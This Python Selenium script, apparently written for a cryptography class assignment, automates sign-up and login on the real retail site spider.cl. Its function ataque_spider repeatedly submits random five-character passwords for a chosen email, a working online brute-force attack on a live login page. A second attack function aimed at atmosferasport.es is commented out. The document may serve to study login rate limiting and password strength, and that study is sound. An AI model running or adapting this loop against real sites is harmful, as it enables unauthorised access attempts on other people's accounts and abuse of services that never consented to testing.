import time
import random
import string
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
def registro_spider(correo):
    letters = string.ascii_letters
    numbers = string.digits
    driver.get("https://www.spider.cl/")
    time.sleep(5)
    clk = driver.find_element_by_id("onesignal-slidedown-cancel-button").click()
    time.sleep(1)
    clk = driver.find_element_by_xpath("//*[@id='header']/div/nav/div[2]/div/div/div/div/div[2]/div/ul/li[2]/a").click()
    time.sleep(1)
    nombre = driver.find_element_by_xpath('//*[@id="index"]/div[6]/div/div/div[2]/div[1]/div[2]/form/div[3]/input')
    nombre.send_keys("Tarea")
    apellido = driver.find_element_by_xpath('//*[@id="index"]/div[6]/div/div/div[2]/div[1]/div[2]/form/div[4]/input')
    apellido.send_keys("Criptografia")
    mail = driver.find_element_by_xpath('//*[@id="index"]/div[6]/div/div/div[2]/div[1]/div[2]/form/div[5]/input')
    mail.send_keys(correo)
    passwd = driver.find_element_by_xpath('//*[@id="index"]/div[6]/div/div/div[2]/div[1]/div[2]/form/div[6]/input')
    pw = ''.join(random.choice(letters+numbers) for j in range(5))
    passwd.send_keys(pw)
    clk = driver.find_element_by_xpath('//*[@id="index"]/div[6]/div/div/div[2]/div[1]/div[2]/form/div[7]/button').click()
    time.sleep(10)
    return correo, pw

def inicio_spider(correo, pw):
    driver.get("https://www.spider.cl/")
    clk = driver.find_element_by_id("onesignal-slidedown-cancel-button").click()
    time.sleep(1)
    clk = driver.find_element_by_xpath("//*[@id='header']/div/nav/div[2]/div/div/div/div/div[2]/div/ul/li[1]/a").click()
    time.sleep(1)
    usuario = driver.find_element_by_xpath("//*[@id='index']/div[6]/div/div/div[2]/div[1]/div[1]/form/div[3]/input")
    usuario.clear()
    usuario.send_keys(correo)
    passwd = driver.find_element_by_xpath("//*[@id='index']/div[6]/div/div/div[2]/div[1]/div[1]/form/div[4]/input")
    passwd.clear()
    passwd.send_keys(pw)
    clk = driver.find_element_by_xpath("//*[@id='index']/div[6]/div/div/div[2]/div[1]/div[1]/form/div[6]/button").click()
    time.sleep(5)
    clk = driver.find_element_by_xpath("//*[@id='index']/div[6]/div/div/div[2]/div[1]/div[1]/form/div[6]/button").click()

def reestablecer_spider():
    return
def cambiar_pw(correo, pw):
    inicio_spider(correo, pw)
    driver.current_window_handle
    clk = driver.find_element_by_xpath('//*[@id="header"]/div/nav/div[2]/div/div/div/div/div[2]/div/ul/li[1]/a').click()
    return  
def ataque_spider(correo, intentos):
    driver = webdriver.Chrome()
    driver.get("https://www.spider.cl/")
    clk = driver.find_element_by_id("onesignal-slidedown-cancel-button").click()
    time.sleep(1)
    clk = driver.find_element_by_xpath("//*[@id='header']/div/nav/div[2]/div/div/div/div/div[2]/div/ul/li[1]/a").click()
    letters = string.ascii_letters
    numbers = string.digits
    time.sleep(1)
    for i in range(intentos):
        usuario = driver.find_element_by_xpath("//*[@id='index']/div[6]/div/div/div[2]/div[1]/div[1]/form/div[3]/input")
        usuario.clear()
        usuario.send_keys(correo)
        passwd = driver.find_element_by_xpath("//*[@id='index']/div[6]/div/div/div[2]/div[1]/div[1]/form/div[4]/input")
        passwd.clear()
        pw_in = ''.join(random.choice(letters+numbers) for j in range(5))
        passwd.send_keys(pw_in)
        clk = driver.find_element_by_xpath("//*[@id='index']/div[6]/div/div/div[2]/div[1]/div[1]/form/div[6]/button").click()
        time.sleep(1)
    time.sleep(5)
    driver.quit()

def ataque_atmosferasport(correo, intentos):
    '''
    driver = webdriver.Chrome()
    driver.get("https://www.atmosferasport.es/inicio-sesion")
    letters = string.ascii_letters
    numbers = string.digits
    try:
        clk = driver.find_element_by_xpath("//*[@id='authentication']/div[6]/div/div/a").click()
    except:
        print("")
    usuario = driver.find_element_by_xpath("//*[@id='email']")
    usuario.clear()
    usuario.send_keys(correo)
    #for i in range(intentos):
    time.sleep(5)
    driver.quit()
    '''

    return 0